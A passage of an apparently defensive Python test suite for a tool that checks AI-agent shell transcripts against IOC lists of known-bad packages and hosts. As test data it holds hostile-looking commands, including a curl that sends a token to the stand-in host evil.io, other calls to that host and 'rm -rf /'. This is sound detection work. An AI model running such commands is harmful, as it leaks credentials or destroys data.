class TestFlags(FleetCase, unittest.TestCase):
    def test_flag_shape(self):
        f = self.fleet("npm:x@=1.0.0 id=MAL-1\nhost:evil.io label=exfil\n", "npx x@1.0.0", "curl https://evil.io/a")
        flags = {fl["program"]: fl for fl in self.ioc_flags(f)}
        self.assertEqual(set(flags), {"npm:x@1.0.0", "host:evil.io"})
        fl = flags["npm:x@1.0.0"]
        self.assertEqual((fl["severity"], fl["categories"], fl["project"], fl["had_secret"], fl["suppressed"]),
                         ("high", ["network-ioc"], "proj", False, False))
        self.assertEqual(fl["id"], af.flag_id("high", ["network-ioc"], "npm:x@1.0.0"))
        self.assertEqual(fl["evidence"], "1 install(s) of npm:x@1.0.0 via npx (unasked) — ran it (npx); MAL-1")
        self.assertIn("via curl (unasked); exfil", flags["host:evil.io"]["evidence"])
        self.assertEqual(f.ioc_rows[0]["flag_id"], fl["id"])

    def test_flag_ids_are_stable_and_category_specific(self):           # T-GATE-5
        a = self.ioc_flags(self.fleet("npm:x\n", "npm i x@1.0.0"))[0]["id"]
        b = self.ioc_flags(self.fleet("npm:x\n", "npm i x@1.0.0"))[0]["id"]
        self.assertEqual(a, b)
        self.assertNotEqual(af.flag_id("high", ["network-ioc"], "npm:x@1.0.0"),
                            af.flag_id("med", ["network-ioc-unresolved"], "npm:x@1.0.0"))
        u = self.ioc_flags(self.fleet("npm:x@=1.0.0\n", "npm i x"))[0]
        self.assertEqual(u["id"], af.flag_id("med", ["network-ioc-unresolved"], "npm:x@?"))

    def test_one_flag_per_group(self):                                  # T-GATE-6
        f = self.fleet("npm:x@=1.0.0\n", *["npm i x@1.0.0"] * 40)
        [fl] = self.ioc_flags(f)
        self.assertTrue(fl["evidence"].startswith("40 install(s) of npm:x@1.0.0"))
        self.assertEqual((len(f.ioc_rows), f.ioc_totals["match"]), (40, 40))

    def test_suppressed_match_stays_counted(self):                      # T-GATE-4
        fid = af.flag_id("high", ["network-ioc"], "npm:x@1.0.0")
        f = self.fleet("npm:x\n", "npm i x@1.0.0", suppress={fid: "private package, same name"})
        [fl] = self.ioc_flags(f)
        self.assertTrue(fl["suppressed"])
        self.assertEqual(fl["suppressed_reason"], "private package, same name")
        self.assertEqual((f.ioc_totals["suppressed"], f.suppressed_flags, f.ioc_totals["match"]), (1, 1, 1))
        self.assertTrue(f.ioc_rows[0]["suppressed"])

    def test_evidence_is_redacted_then_cut(self):
        token = "ghp_" + "A" * 36
        f = self.fleet("host:evil.io\n", f"curl https://evil.io/x?t={token} " + "x" * 400)
        [fl] = self.ioc_flags(f)
        self.assertNotIn(token, fl["evidence"])
        self.assertLessEqual(len(fl["evidence"]), 240)


# Run in a child process so the time and the peak memory are the loader's own.
_CHILD = r"""
import importlib.util, json, resource, sys, time
spec = importlib.util.spec_from_file_location("actualis", sys.argv[1])
af = importlib.util.module_from_spec(spec); spec.loader.exec_module(af)
for kv in sys.argv[2].split(",") if sys.argv[2] else ():
    k, v = kv.split("="); setattr(af, k, int(v))
unit = 1 if sys.platform == "darwin" else 1024
base = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss * unit
t = time.perf_counter()
err = None
try:
    ioc = af.load_ioc(sys.argv[3:])
    info = {"entries": ioc.total, "sources": ioc.sources}
except ValueError as exc:
    err, info = str(exc), None
dt = time.perf_counter() - t
peak = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss * unit
print(json.dumps({"dt": dt, "mb": (peak - base) / 1e6, "err": err, "info": info}))
"""


class TestLoaderCaps(IocFiles, unittest.TestCase):
    """Every cap is hard and enforced while reading: an IOC file may have been
    downloaded, so it is untrusted. Each case exits 2 (a ValueError) or
    degrades, within 2 s and modest memory."""

    def child(self, *paths, patch=""):
        import subprocess
        out = subprocess.run([sys.executable, "-I", "-c", _CHILD, str(ROOT / "actualis.py"), patch, *paths],
                             capture_output=True, text=True, timeout=120)
        self.assertEqual(out.returncode, 0, out.stderr[-2000:])
        self.assertNotIn("Traceback", out.stderr)
        return json.loads(out.stdout)

    def bounded(self, r, seconds=2.0, mb=64):
        # 2 s is the dev-Mac budget. A shared CI runner gets the spec's loose
        # ceiling (section 11) so a slow neighbour cannot flake the suite.
        self.assertLess(r["dt"], seconds if not os.environ.get("CI") else 10.0, r)
        self.assertLess(r["mb"], mb, r)

    def test_oversized_file(self):
        path = self.dir / "big.jsonl"
        with open(path, "wb") as fh:                   # sparse: no real disk used
            fh.write(b"{")
            fh.truncate(af.IOC_FILE_MAX + 1)
        r = self.child(str(path))
        self.bounded(r)
        self.assertIn("over 1 GiB", r["err"])

    def test_total_across_files(self):
        a = self.write("npm:a\n" + "#" * 3000 + "\n", "a.txt")
        b = self.write("npm:b\n" + "#" * 3000 + "\n", "b.txt")
        r = self.child(a, b, patch="IOC_FILE_MAX=4096")
        self.assertIn("b.txt", r["err"])
        self.assertIn("across all --ioc files", r["err"])

    def test_huge_single_line_is_never_buffered(self):
        path = self.write(b"npm:x " + b"a" * (60 << 20), "line.txt")
        r = self.child(path)
        self.bounded(r, mb=32)
        self.assertIn("line 1", r["err"])
        self.assertIn("over 1 MiB", r["err"])

    def test_deep_nesting(self):
        deep = "[" * 100_000 + "]" * 100_000
        for name, text in (("deep.json", deep), ("deep.jsonl", '{"a":' + deep + "}\n{}\n")):
            with self.subTest(name=name):
                r = self.child(self.write(text, name))
                self.bounded(r)
                self.assertIn("nested", r["err"])

    def test_a_million_entries(self):
        path = self.write("".join(f"npm:p{i}\n" for i in range(af.IOC_ENTRIES_MAX + 1)), "million.txt")
        r = self.child(path)
        self.assertIn("over 1,000,000 entries", r["err"])
        self.bounded(r, mb=1024)                     # O(entries): the cap is the bound

    def test_long_versions(self):
        self.fails("npm:x@=" + "1" * 10_000 + "\n", "over 128")
        rec = osv("x", versions=["1" * 10_000, "1.0.0"],
                  ranges=[rng(("introduced", "1.0.0"), ("fixed", "2" * 10_000))])
        e = only(self.load(json.dumps(rec), "o.json"))
        self.assertEqual(e.spec_text, "=1.0.0||undecidable")

    def test_many_events(self):
        ev = [("introduced", f"1.0.{i}") for i in range(100_000)]
        r = self.child(self.write(json.dumps(osv("x", ranges=[rng(*ev)])), "events.json"))
        self.bounded(r, mb=128)
        self.assertIsNone(r["err"])
        self.assertEqual(r["info"]["sources"][0]["skipped_ranges"], 1)

    def test_many_alternatives(self):
        self.fails("npm:x@" + "||".join(f"=1.0.{i}" for i in range(af.IOC_CLAUSES_MAX + 1)) + "\n",
                   "line 1", "alternatives")
        rec = osv("x", versions=[f"1.0.{i}" for i in range(af.IOC_CLAUSES_MAX + 1)])
        ioc = self.load(json.dumps([rec, osv("y")]), "o.json")
        self.assertEqual(ioc.packages[("npm", "x")][0].spec_text, "undecidable")     # never dropped
        self.assertEqual(ioc.sources[0]["skipped_ranges"], 1)

    def test_a_file_of_comments_is_bounded(self):
        r = self.child(self.write("#\n" * (30 << 20), "comments.txt"))
        self.bounded(r)
        self.assertIn("lines", r["err"])

    def test_matching_cost_is_per_distinct_item(self):
        lines = "".join(f"npm:x@=1.0.{i}\n" for i in range(20_000))
        f = af.Fleet()
        f.suppressions = {}
        for k in range(2_000):
            f.add_tool("p", "Bash", {"command": "npm i x@2.0.0"}, TS, "auto")
        ioc = self.load(lines)
        t = time.perf_counter()
        af.apply_ioc(f, ioc)
        self.assertLess(time.perf_counter() - t, 2.0)
        self.assertEqual(f.ioc_totals["clean_name_matches"], 2_000)


class TestBypassMatrix(FleetCase, unittest.TestCase):
    """Each listed IOC is matched, or unresolved where the version truly cannot
    be decided. None is ever silently clean."""
    DIGEST = "sha256:" + "ab" * 32
    MATRIX = [
        # (ioc line, command, expected verdict)
        ("pypi:Evil_Pkg", "pip install evil-pkg==1.0", "match"),
        ("pypi:evil.pkg", "pip install EVIL-PKG==1.0", "match"),
        ("pypi:EVIL-PKG@=1.0", "pip install Evil_Pkg==1.0", "match"),
        ("pypi:evil-pkg@=1.0", "pip install 'evil-pkg[extra]==1.0'", "match"),
        ("pypi:evil-pkg", "pip install 'evil.pkg[extra]>=1'", "match"),
        ("npm:Evil", "npm i Evil@1.0.0", "match"),
        ("npm:evil@=1.0.0", "npm i x@npm:evil@1.0.0", "match"),
        ("npm:x", "npm i x@npm:evil@1.0.0", "match"),
        ("npm:x@=1.0.0", "npm i x@npm:evil@1.0.0", "unresolved"),
        ("npm:@scope/evil@=1.0.0", "npm i @scope/evil@1.0.0", "match"),
        ("npm:@scope/evil", "npx @scope/evil", "match"),
        ("npm:evil@=1.0.0", "npm i evil@v1.0.0", "match"),
        ("npm:evil@=1.0.0", "npm i evil@=1.0.0", "match"),
        ("npm:evil", "npm i https://evil.example/evil-1.0.0.tgz", "unresolved"),
        ("npm:evil", "npm i https://registry.npmjs.org/evil/-/evil-1.0.0.tgz", "unresolved"),
        ("npm:@s/evil", "npm i https://registry.npmjs.org/@s/evil/-/evil-1.0.0.tgz", "unresolved"),
        ("npm:evil", "npm i git+https://github.com/org/evil.git", "unresolved"),
        ("npm:evil@=1.0.0", "npm i github:org/evil", "unresolved"),
        ("npm:evil@=1.0.0-beta", "npm i evil@1.0.0-beta", "match"),
        ("npm:evil@=1.0.0", "npm i evil@1.0.0+build.7", "match"),
        ("npm:evil@<1.0.0", "npm i evil@1.0.0-beta", "match"),
        ("npm:evil@=1.0.0", "npm i evil", "unresolved"),
        ("pypi:evil@=1!2.0", "pip install evil==1!2.0", "match"),
        ("pypi:evil@=1.0", "pip install evil==1.0+local", "match"),
        ("pypi:evil@>=1!0", "pip install evil==1!2.0", "match"),
        ("go:evil.example/m@<v1.4.0", "go install evil.example/m@latest", "unresolved"),
        ("go:evil.example/m@=v2.0.0", "go get evil.example/m@v2.0.0+incompatible", "match"),
        ("go:evil.example/m@<v3.0.0", "go get evil.example/m@v2.1.0+incompatible", "match"),
        ("oci:docker.io/library/evil", "docker pull evil", "match"),
        ("oci:evil", "docker pull docker.io/library/evil:1.0", "match"),
        (f"oci:evil@={DIGEST}", f"docker pull evil@{DIGEST}", "match"),
        ("oci:evil@=1.0", f"docker pull evil@{DIGEST}", "unresolved"),
        ("host:evil.io", "curl https://sub.evil.io/x", "match"),
        ("host:evil.io", "curl https://SUB.EVIL.IO/x", "match"),
        ("host:evil.io", "curl https://evil.io./x", "match"),
        ("host:evil.io", "curl https://user:pw@evil.io/x", "match"),
        ("host:=evil.io", "curl https://sub.evil.io/x", None),
        ("host:=evil.io", "curl https://evil.io/x", "match"),
        ("host:evil.io", "npm i --registry https://evil.io x", "match"),
        ("host:evil.io", "pip install -i https://evil.io/simple x", "match"),
    ]

    def test_ioc_bypass_matrix(self):
        for line, cmd, want in self.MATRIX:
            with self.subTest(ioc=line, cmd=cmd):
                f = self.fleet(line + "\n", cmd)
                got = f.ioc_rows[0]["verdict"] if f.ioc_rows else None
                self.assertEqual(got, want, (line, cmd, f.ioc_rows and f.ioc_rows[0]["reason"]))
                if want is not None:
                    self.assertEqual(f.ioc_totals["clean_name_matches"], 0)

    def test_refused_is_listed_never_clean(self):
        f = self.fleet("npm:evil\n", "npm i evil@1.0.0", refuse=[0])
        self.assertEqual((f.ioc_rows[0]["verdict"], f.ioc_rows[0]["refused"]), ("match", True))
        self.assertEqual(f.ioc_totals["clean_name_matches"], 0)

    def test_trusted_host_never_exempts(self):
        f = self.fleet("host:evil.io\nnpm:x\n", "curl https://evil.io/x", "npm i --registry https://evil.io x",
                       trust=["evil.io"])
        self.assertTrue(all(i["trusted"] for i in f.network_items))
        self.assertEqual([r["verdict"] for r in f.ioc_rows], ["match", "match"])


class TestRegexTiming(unittest.TestCase):
    """Every pattern the IOC code adds (and _TRUST_ENTRY, which host entries
    use) stays under 0.1 s on 32 KB adversarial input, however it is called."""
    N = 32 * 1024
    UNITS = [".", "-", "0", "+", "@", "a", "1", "a-", "a.", "0.", "1.0-", "-0.0", "\\\"", "\"", "[", "{",
             "]", "[]", "a@", "a/", "/a", "1!", "a_", "~", "a.b-", "x:", "||", ",=", "1.", "-a"]

    def bodies(self):
        for unit in self.UNITS:
            s = (unit * (self.N // len(unit) + 1))[:self.N]
            yield from (s, s + "!", "a" + s + "\x00", "1.0.0-" + s, "1.0.0+" + s, "v1." + s, s + "]", "[" + s)

    def patterns(self):
        pats = {k: v for k, v in vars(af).items()
                if k.startswith(("_IOC", "IOC")) and hasattr(v, "fullmatch") and hasattr(v, "pattern")}
        pats.update({f"_IOC_NAME[{k}]": v for k, v in af._IOC_NAME.items()})
        pats.update({f"_IOC_ATTR_VALUE[{k}]": v for k, v in af._IOC_ATTR_VALUE.items()})
        pats["_TRUST_ENTRY"] = af._TRUST_ENTRY
        return pats

    def test_every_pattern(self):
        pats = self.patterns()
        self.assertGreaterEqual(len(pats), 20)
        for name, p in pats.items():
            for b in self.bodies():
                data = b.encode() if isinstance(p.pattern, bytes) else b
                for fn in (p.fullmatch, p.search, p.match):
                    t = time.perf_counter()
                    fn(data)
                    self.assertLess(time.perf_counter() - t, 0.1, (name, fn.__name__, b[:16]))

    def test_every_scanner(self):
        scanners = [af._ioc_semver_key, af._ioc_pep440_key, lambda v: af._ioc_url_name(
                        {"ecosystem": "npm", "url": "https://x.io/" + v}),
                    lambda v: af._ioc_norm_name("pypi", v), lambda v: af._ioc_json_depth(v.encode()),
                    lambda v: af._ioc_valid_name("go", v)]
        for k, fn in enumerate(scanners):
            for b in self.bodies():
                t = time.perf_counter()
                try:
                    fn(b)
                except af._IocError:
                    pass
                self.assertLess(time.perf_counter() - t, 0.1, (k, b[:16]))
        for spec in self.bodies():
            for eco in ("npm", "pypi", "oci"):
                t = time.perf_counter()
                try:
                    af._ioc_parse_spec(eco, spec)
                except af._IocError:
                    pass
                self.assertLess(time.perf_counter() - t, 0.1, (eco, spec[:16]))


class TestFailClosed(FleetCase, unittest.TestCase):
    """An error or a cap hit while checking an item never leaves it clean: it
    is unresolved (medium) and counted in totals.undecidable."""

    def test_a_raising_comparator(self):
        old = af._ioc_spec_contains

        def boom(*a):
            raise RuntimeError("comparator bug")
        af._ioc_spec_contains = boom
        try:
            f = self.fleet("npm:evil@=1.0.0\n", "npm i evil@1.0.0")
        finally:
            af._ioc_spec_contains = old
        self.assertEqual((f.ioc_rows[0]["verdict"], f.ioc_rows[0]["reason"]), ("unresolved", "undecidable"))
        self.assertEqual((f.ioc_totals["undecidable"], f.ioc_totals["unresolved"]), (1, 1))
        self.assertEqual([fl["categories"] for fl in self.ioc_flags(f)], [["network-ioc-unresolved"]])

    def test_a_raising_item_evaluation(self):
        old = af._ioc_resolved

        def boom(item):
            raise RuntimeError("resolver bug")
        af._ioc_resolved = boom
        try:
            f = self.fleet("npm:evil@=1.0.0\n", "npm i evil@1.0.0")
        finally:
            af._ioc_resolved = old
        row = f.ioc_rows[0]
        self.assertEqual((row["verdict"], row["reason"], row["entries"][0].kind), ("unresolved", "error", "error"))
        self.assertEqual((f.ioc_totals["undecidable"], f.network_items[0]["ioc"]), (1, "unresolved"))
        [fl] = self.ioc_flags(f)
        self.assertEqual((fl["severity"], fl["program"]), ("med", "error:npm"))
        self.assertEqual(af.failing_findings(f, "any") != [], True)

    def test_an_over_long_item_version(self):
        long = "1.0.0-" + "a" * 10_000
        self.assertEqual(self.verdict("npm:evil@=1.0.0\n", f"npm i evil@{long}"), UNRESOLVED)
        f = self.fleet("pypi:evil@=1.0\n", "pip install evil==1." + "0" * 10_000)
        self.assertEqual((f.ioc_rows[0]["verdict"], f.ioc_rows[0]["reason"]), ("unresolved", "undecidable"))
        self.assertEqual(f.ioc_totals["undecidable"], 1)

    def test_a_host_past_the_label_cap(self):
        host = "a." * 200 + "evil.io"
        self.assertEqual(self.verdict("host:evil.io\n", f"curl https://{host}/x"), ("unresolved", "error"))
        self.assertIsNone(self.verdict("npm:zzz\n", f"curl https://{host}/x"))


def text_of(fn):
    buf = io.StringIO()
    with redirect_stdout(buf):
        fn()
    return buf.getvalue()


POPULATED = ("npm:evil@=1.0.0||=1.0.1 id=MAL-2025-1 label=wave1 from=2025-09-14 until=2025-09-17\n"
             "npm:pending@=2.0.0 id=GHSA-aaaa-bbbb-cccc\n"
             "host:github.com/evil-org label=exfil\n"
             "rubygems:rest-client\n")
POPULATED_CMDS = ("npm i evil@1.0.0", "npm i pending", "git clone https://github.com/evil-org/r",
                  "npm i evil@1.0.1", "npm i fine@1.0.0")


class TestOutput(FleetCase, unittest.TestCase):
    def populated(self, **kw):
        return self.fleet(POPULATED, *POPULATED_CMDS, refuse=[3], **kw)

    def test_json_without_ioc(self):                                   # T-OUT-1
        j = af.to_json(self.fleet(None, "npm i x"))["network"]
        self.assertEqual(list(j)[-1], "ioc")
        self.assertEqual(j["ioc"], {"enabled": False, "sources": [], "totals": af._ioc_zero_totals(),
                                    "matches": [], "matches_truncated": False})
        self.assertIsNone(j["items"][0]["ioc"])
        self.assertEqual(af.to_json(af.Fleet())["network"]["ioc"]["enabled"], False)

    def test_json_populated(self):
        j = af.to_json(self.populated())["network"]["ioc"]
        self.assertTrue(j["enabled"])
        [src] = j["sources"]
        self.assertEqual((src["format"], src["entries"], src["not_checkable"]),
                         ("lines", {"package": 2, "host": 1}, {"rubygems": 1}))
        self.assertTrue(Path(src["path"]).is_absolute())
        self.assertFalse(src["mtime_in_window"])
        t = j["totals"]
        self.assertEqual((t["match"], t["unresolved"], t["refused"], t["clean_name_matches"]), (2, 1, 1, 0))
        self.assertEqual([m["refused"] for m in j["matches"]], [False, False, False, True])
        self.assertEqual([m["verdict"] for m in j["matches"][:3]], ["match", "match", "unresolved"])
        first = next(m for m in j["matches"] if m["entry"]["name"] == "evil" and not m["refused"])
        self.assertEqual((first["refs"], first["labels"], first["entry"]["from"], first["entry"]["until"]),
                         (["MAL-2025-1"], ["wave1"], "2025-09-14", "2025-09-17"))
        self.assertEqual(first["entry"]["spec"], "=1.0.0||=1.0.1")
        self.assertEqual(first["item"]["ioc"], "match")
        self.assertEqual(set(first["item"]), set(af.NETWORK_ITEM_KEYS))
        refused = j["matches"][-1]
        self.assertIsNone(refused["flag_id"])
        host = next(m for m in j["matches"] if m["reason"] == "host")
        self.assertEqual((host["entry"]["host"], host["entry"]["path"], host["entry"]["ecosystem"]),
                         ("github.com", "/evil-org", None))

    def test_mtime_in_window(self):
        f = self.populated()
        f.first_ts = datetime(2000, 1, 1, tzinfo=timezone.utc)
        f.last_ts = datetime(2100, 1, 1, tzinfo=timezone.utc)
        self.assertTrue(af.to_json(f)["network"]["ioc"]["sources"][0]["mtime_in_window"])
        self.assertIn("modified during the window", text_of(lambda: af.render_network(f, af.C(False), 12)))

    def test_matches_are_capped(self):
        old = af.NETWORK_ITEMS_CAP
        af.NETWORK_ITEMS_CAP = 3
        try:
            j = af.to_json(self.fleet("npm:x\n", *[f"npm i x@1.0.{i}" for i in range(5)]))["network"]["ioc"]
        finally:
            af.NETWORK_ITEMS_CAP = old
        self.assertEqual((len(j["matches"]), j["matches_truncated"]), (3, True))

    def test_deterministic(self):                                       # T-OUT-2
        a, b = self.populated(), self.populated()
        self.assertEqual(json.dumps(af.to_json(a)), json.dumps(af.to_json(b)))
        self.assertEqual(text_of(lambda: af.render(a, af.C(False), False, 12)),
                         text_of(lambda: af.render(b, af.C(False), False, 12)))

    def test_text_block(self):                                          # T-OUT-3
        out = text_of(lambda: af.render_network(self.populated(), af.C(False), 12))
        self.assertLess(out.index("IOC"), out.index("INSTALLED"))
        self.assertIn("IOC        2 match · 1 unresolved · 1 refused", out)
        self.assertIn("iocs.txt  sha256 ", out)
        self.assertIn("2 package · 1 host", out)
        self.assertIn("not checkable: rubygems 1", out)
        self.assertIn("checked 4 of 4 downloads", out)
        self.assertIn("from/until are shown, not yet applied", out)
        self.assertRegex(out, r"MATCH +npm evil@1\.0\.0 +proj")
        self.assertIn("MAL-2025-1", out)
        self.assertRegex(out, r"MATCH +host github\.com/evil-org \(git\)")
        self.assertRegex(out, r"UNRESOLVED npm pending \(no version\).*version not resolved")
        self.assertRegex(out, r"REFUSED +npm evil@1\.0\.1 .*never ran")
        self.assertIn('No match is not "not affected"', out)
        self.assertLess(out.index("UNRESOLVED"), out.index("REFUSED"))

    def test_text_block_with_no_downloads(self):
        f = af.Fleet()
        f.suppressions = {}
        af.apply_network_policy(f, [], False)
        af.apply_ioc(f, self.load("npm:x\n"))
        out = text_of(lambda: af.render_network(f, af.C(False), 12))
        self.assertIn("no downloads seen", out)
        self.assertIn("IOC        no match in 0 checkable downloads (1 entries)", out)
        self.assertIn('No match is not "not affected"', out)
        self.assertNotIn("from/until", out)

    def test_no_block_without_ioc(self):
        out = text_of(lambda: af.render_network(self.fleet(None, "npm i x"), af.C(False), 12))
        self.assertNotIn("IOC", out)

    def test_row_cap_ignores_top(self):
        f = self.fleet("npm:x\n", *[f"npm i x@1.0.{i}" for i in range(55)])
        out = text_of(lambda: af.render_network(f, af.C(False), 3))
        self.assertEqual(out.count("MATCH "), 50)
        self.assertIn("+5 more (--json for all)", out)

    def test_suppressed_row(self):
        fid = af.flag_id("high", ["network-ioc"], "npm:x@1.0.0")
        f = self.fleet("npm:x id=MAL-9\n", "npm i x@1.0.0", suppress={fid: "ours"})
        out = text_of(lambda: af.render_network(f, af.C(False), 12))
        self.assertIn("1 suppressed", out)
        self.assertRegex(out, r"MATCH .* suppressed")
        self.assertNotIn("MAL-9", out.split("MATCH", 1)[1].split("\n")[0])

    def test_diff_against_old_baselines(self):                          # T-OUT-4
        new = af.to_json(self.populated())
        old_branch = json.loads(json.dumps(new))
        del old_branch["network"]["ioc"]
        old_branch["bash"]["flags"] = [fl for fl in old_branch["bash"]["flags"]
                                       if not fl["categories"][0].startswith("network-ioc")]
        old_branch["report_sha256"] = "0" * 64
        old_022 = {k: v for k, v in old_branch.items() if k != "network"}
        for old in (old_022, old_branch):
            d = af.diff_reports(old, new)
            out = text_of(lambda: af.render_diff(d, af.C(False)))
            self.assertIn("network-ioc", json.dumps(d) + out)

    def test_share_and_card_leak_nothing(self):                         # T-OUT-5
        canaries = ["canarypkg", "CANARY-REF-1", "canarylabel", "canary-host.example", "canarydir"]
        d = self.dir / "canarydir"
        d.mkdir()
        (d / "list.txt").write_text("npm:canarypkg id=CANARY-REF-1 label=canarylabel\n"
                                    "host:canary-host.example\n")
        f = af.Fleet()
        f.suppressions = {}
        f.add_tool("p", "Bash", {"command": "npm i canarypkg@1.0.0"}, TS, "auto")
        f.add_tool("p", "Bash", {"command": "curl https://canary-host.example/x"}, TS, "auto")
        af.apply_network_policy(f, [], False)
        af.apply_ioc(f, af.load_ioc([str(d / "list.txt")]))
        self.assertEqual(f.ioc_totals["match"], 2)
        outs = {"share": text_of(lambda: af.render_share(f, af.C(False)))}
        for mode in ("cost", "supervision", "volume"):
            outs["card-" + mode] = json.dumps(af.card_model(f, mode), ensure_ascii=False)
        for name, text in outs.items():
            for canary in canaries + ["IOC", "ioc", "known-bad"]:
                self.assertNotIn(canary, text, (name, canary))

    def test_escape_canary(self):                                       # T-OUT-6
        bad = "\x1b[2J\r‮\x9b31m"
        rec = osv("evil" + bad, versions=["1.0.0"])
        ioc_text = json.dumps([rec, osv("evil", versions=["1.0.0"])])
        f = af.Fleet()
        f.suppressions = {}
        f.add_tool("p" + bad, "Bash", {"command": f"npm i evil@1.0.0 # {bad}"}, TS, "auto" + bad)
        f.add_tool("p" + bad, "Bash", {"command": f"curl https://evil.io/{bad}"}, TS, "auto")
        af.apply_network_policy(f, [], False)
        ioc = self.load(ioc_text + "", "o.json")
        self.assertEqual(ioc.sources[0]["skipped"], 1)
        af.apply_ioc(f, ioc)
        outs = [text_of(lambda: af.render(f, af.C(False), False, 12)), json.dumps(af.to_json(f), ensure_ascii=False)]
        for text in outs:
            for lo, hi, why in af._STRIPPED_RANGES:
                for ch in text:
                    self.assertFalse(lo <= ord(ch) <= hi, f"U+{ord(ch):04X} ({why})")


def _call(tid, command, mode="bypassPermissions"):
    return {"timestamp": "2026-10-01T10:00:00Z", "type": "assistant", "uuid": "a" + tid, "sessionId": "sess-1",
            "permissionMode": mode,
            "message": {"id": "m" + tid, "role": "assistant", "model": "claude-sonnet-5",
                        "usage": {"input_tokens": 10, "output_tokens": 10},
                        "content": [{"type": "tool_use", "id": tid, "name": "Bash",
                                     "input": {"command": command}}]}}


class TestCli(IocFiles, unittest.TestCase):
    """main(): the load point, mode rules, exit codes and the gate. Transcripts
    and HOME are temporary; nothing real is read."""

    def setUp(self):
        super().setUp()
        root = self.dir / "transcripts" / "-Users-x-proj"
        root.mkdir(parents=True)
        recs = [_call("t1", "npm i evil@1.0.0"), _call("t2", "npm i pending"), _call("t3", "curl https://evil.io/x")]
        (root / "s.jsonl").write_text("\n".join(json.dumps(r) for r in recs) + "\n")
        self.root = str(self.dir / "transcripts")
        self.home = self.dir / "home"
        self.home.mkdir()
        self.cwd = self.dir / "cwd"
        self.cwd.mkdir()

    def main(self, *argv):
        old_cwd, old_env = os.getcwd(), dict(os.environ)
        os.environ.update(HOME=str(self.home), XDG_CONFIG_HOME=str(self.home / ".config"))
        os.chdir(self.cwd)
        out, err = io.StringIO(), io.StringIO()
        try:
            with redirect_stdout(out), redirect_stderr(err):
                try:
                    code = af.main(list(argv))
                except SystemExit as exc:
                    code = exc.code
        finally:
            os.chdir(old_cwd)
            os.environ.clear()
            os.environ.update(old_env)
        return code, out.getvalue(), err.getvalue()

    def test_scan_with_ioc(self):
        ioc = self.write("npm:evil@=1.0.0 id=MAL-1\nnpm:pending@=1.0.0\n")
        code, out, err = self.main("--root", self.root, "--ioc", ioc, "--json")
        self.assertEqual(code, 0, err)
        j = json.loads(out)["network"]["ioc"]
        self.assertEqual((j["enabled"], j["totals"]["match"], j["totals"]["unresolved"]), (True, 1, 1))
        code, out, err = self.main("--root", self.root, "--ioc", ioc)
        self.assertIn("IOC        1 match · 1 unresolved", out)

    def test_gates(self):                                               # T-GATE-1, T-GATE-2
        ioc = self.write("npm:evil@=1.0.0\nnpm:pending@=1.0.0\n")
        code, _, err = self.main("--root", self.root, "--ioc", ioc, "--fail-on", "critical")
        self.assertEqual(code, 0, err)
        code, _, err = self.main("--root", self.root, "--ioc", ioc, "--fail-on", "high")
        self.assertEqual(code, 3, err)
        self.assertIn("1 known-bad download group(s) (IOC)", err)
        self.assertNotIn("unresolved IOC", err)
        self.assertNotIn("high-severity shell command", err)
        code, _, err = self.main("--root", self.root, "--ioc", ioc, "--fail-on", "any")
        self.assertEqual(code, 3)
        self.assertIn("1 unresolved IOC match group(s)", err)
        self.assertNotIn("medium-severity shell command", err)
        only_unresolved = self.write("npm:pending@=1.0.0\n", "u.txt")
        self.assertEqual(self.main("--root", self.root, "--ioc", only_unresolved, "--fail-on", "high")[0], 0)

    def test_trusted_host_never_exempts(self):
        ioc = self.write("host:evil.io\n")
        code, out, err = self.main("--root", self.root, "--network-trust", "evil.io", "--ioc", ioc,
                                   "--fail-on", "high", "--json")
        self.assertEqual(code, 3, err)
        j = json.loads(out)["network"]
        self.assertTrue(next(i for i in j["items"] if i["host"] == "evil.io")["trusted"])
        self.assertEqual(j["ioc"]["totals"]["match"], 1)

    def test_load_errors_exit_2(self):                                  # T-CLI-1
        for path, needle in ((str(self.dir / "missing.txt"), "cannot read"), (str(self.dir), "cannot read"),
                             (self.write(b"npm:\xff\n", "bad.txt"), "bad.txt line 1"),
                             (self.write("npm:a@^1.0.0\n", "g.txt"), "g.txt line 1")):
            code, _, err = self.main("--root", self.root, "--ioc", path)
            self.assertEqual(code, 2, path)
            self.assertIn(needle, err)

    def test_mode_rules(self):                                          # T-CLI-2
        ioc = self.write("npm:evil\n")
        for extra, needle in ((["--card"], "--ioc does not apply to --card"),
                              (["--watch"], "--ioc is not supported with --watch or --mcp yet"),
                              (["--mcp"], "--ioc is not supported with --watch or --mcp yet")):
            code, _, err = self.main("--ioc", ioc, *extra)
            self.assertEqual(code, 2, extra)
            self.assertIn(needle, err)
        broken = self.write("npm:a@^1\n", "broken.txt")
        self.assertEqual(self.main("--explain", "cache", "--ioc", broken)[0], 0)
        self.assertEqual(self.main("--suppressions", "--ioc", broken)[0], 0)

    def test_cwd_file_is_ignored(self):                                 # T-CLI-3
        (self.cwd / ".actualis-ioc").write_text("npm:evil\nhost:evil.io\n")
        code, out, _ = self.main("--root", self.root, "--json")
        self.assertEqual(code, 0)
        self.assertFalse(json.loads(out)["network"]["ioc"]["enabled"])

    def test_ioc_is_suppressible(self):                                 # T-GATE-4
        ioc = self.write("npm:evil\n")
        fid = af.flag_id("high", ["network-ioc"], "npm:evil@1.0.0")
        self.assertEqual(self.main("--suppress", fid, "--reason", "private package of ours")[0], 0)
        code, out, err = self.main("--root", self.root, "--ioc", ioc, "--fail-on", "high", "--json")
        self.assertEqual(code, 0, err)
        j = json.loads(out)
        self.assertEqual((j["network"]["ioc"]["totals"]["suppressed"], j["suppressed_flags"]), (1, 1))
        self.assertTrue(next(fl for fl in j["bash"]["flags"] if fl["id"] == fid)["suppressed"])

    def test_completions_offer_ioc(self):                               # T-OUT-7
        self.assertEqual(af._VALUE_HINT["--ioc"], "file")
        self.assertIn("--ioc) COMPREPLY=($(compgen -f", af.completion_script("bash"))


class TestGates(FleetCase, unittest.TestCase):
    def test_match_and_unresolved(self):                                # T-GATE-1, T-GATE-2
        f = self.fleet("npm:x@=1.0.0\nnpm:y@=1.0.0\n", "npm i x@1.0.0", "npm i y", "rm -rf /")
        self.assertEqual(af.failing_findings(f, "critical"), [])
        high = af.failing_findings(f, "high")
        self.assertEqual(high[0], "1 known-bad download group(s) (IOC)")
        self.assertIn("1 high-severity shell command(s) flagged", high)
        anyl = af.failing_findings(f, "any")
        self.assertEqual(anyl[:2], ["1 known-bad download group(s) (IOC)", "1 unresolved IOC match group(s)"])

    def test_refused_and_clean_trip_nothing(self):                      # T-GATE-3
